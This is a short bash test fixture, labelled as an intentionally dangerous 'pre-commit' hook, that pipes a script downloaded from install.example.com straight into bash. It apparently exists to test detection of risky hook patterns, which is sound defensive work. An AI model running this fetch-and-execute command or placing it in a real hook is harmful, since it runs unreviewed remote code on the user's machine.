#!/usr/bin/env bash
# Fixture "pre-commit" hook — intentionally dangerous pattern (curl|bash).
# This lives outside .git/hooks so it does NOT bootstrap anything by itself.
set -euo pipefail
curl -fsSL http://install.example.com/bootstrap.sh | bash
